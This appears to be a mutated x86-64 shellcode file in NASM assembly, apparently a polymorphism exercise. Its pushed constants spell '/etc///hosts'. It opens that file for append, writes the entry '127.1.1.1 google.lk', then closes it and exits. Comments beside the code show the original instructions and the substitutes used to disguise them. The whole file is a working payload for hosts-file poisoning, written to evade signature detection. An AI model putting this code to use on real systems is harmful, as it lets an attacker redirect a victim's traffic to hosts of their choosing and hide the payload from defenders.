; File: shellcode-896_mutated.nasm
; Author: Petr Javorik

global _start

section .text

_start:

    ; open
    xor rax, rax
    xor rdi, rdi
    ; add rax, 2
    inc al
    inc al
    ; xor rdi, rdi
    ; xor rsi, rsi
    mov rsi, rdi
    ; push rsi
    push rdi
    push rdi
    ; mov r8, 0x2f2f2f2f6374652f
    ; mov r10, 0x7374736f682f2f2f
    ; push r10
    ; push r8
    mov dword [rsp +8], 0x7374736f
    mov dword [rsp +4], 0x682f2f2f
    mov dword [rsp], 0x6374652f
    ; add rdi, rsp
    mov rdi, rsp
    ; xor rsi, rsi                  ; instruction deleted
    ; add si, 0x401
    xor si, 0x401
    syscall

    ; write
    ; xchg rax, rdi
    ; add rax, 1
    mov rdi, rax
    xor rax, rax
    inc al
    jmp data

write:

    pop rsi
    ; mov dl, 19
    add dl, 19
    syscall

    ; close
    ; xor rax, rax
    ; add rax, 3
    sub al, dl
    add al, 3
    syscall

    ; exit
    ; xor rax, rax                  ; instruction deleted
    ; mov al, 60
    add al, 60
    ; xor rdi, rdi
    sub dil, dil
    syscall

data:
    call write
    text db '127.1.1.1 google.lk'
